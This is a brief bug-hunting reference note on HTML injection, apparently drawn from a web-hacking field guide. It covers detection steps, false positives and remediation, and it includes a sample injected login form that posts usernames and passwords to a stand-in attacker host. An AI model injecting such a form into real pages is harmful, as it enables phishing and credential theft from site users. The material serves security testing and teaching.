# HTML Injection: Fake Form Injection

- What it is: Unsanitized HTML input is rendered as page structure rather than text.
- Look for form fields or URL parameters whose values are reflected into HTML.
- Start with harmless tags such as `<h1>test</h1>` to verify actual HTML rendering.
- If tags render, a form can demonstrate that attacker-controlled UI can appear trusted.
```html
<form method="POST" action="https://attacker.example/capture">
  <input name="username">
  <input type="password" name="password">
  <input type="submit">
</form>
```
- Validate only with test data; the issue depends heavily on user interaction/social engineering.
- False positive: seeing literal `<form>` text means the application escaped or stripped the markup.
- Edge case: content spoofing may permit only plaintext and not HTML tags.
- Remediation: contextually encode/escape untrusted input before rendering it into HTML.
## Source: Real-World Bug Hunting — A Field Guide to Web Hacking, Ch. 5
